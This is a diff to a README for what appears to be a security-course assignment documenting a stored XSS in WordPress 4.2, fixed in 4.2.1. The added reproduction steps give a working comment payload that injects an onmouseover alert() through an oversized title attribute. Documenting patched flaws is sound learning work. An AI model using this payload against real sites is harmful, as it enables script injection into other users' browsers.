@@ -11,8 +11,11 @@ Time spent: **X** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: ![](https://github.com/ayushg97/codepath-week7/blob/master/test.gif)
+  - [ ] GIF Walkthrough: ![](https://github.com/ayushg97/codepath-week7/blob/master/1.gif)
   - [ ] Steps to recreate: 
+    - Copy and paste this text into a wordpress comment 
+    - &lt;a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'&gt;&lt;/a&gt;
+    - Replace the ...[64 lb].. with any amount of data that would result in the total size of the text being over 64kb.
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/changeset/32307/branches/4.2/src/wp-includes/wp-db.php)
 2. (Required) Vulnerability Name or ID
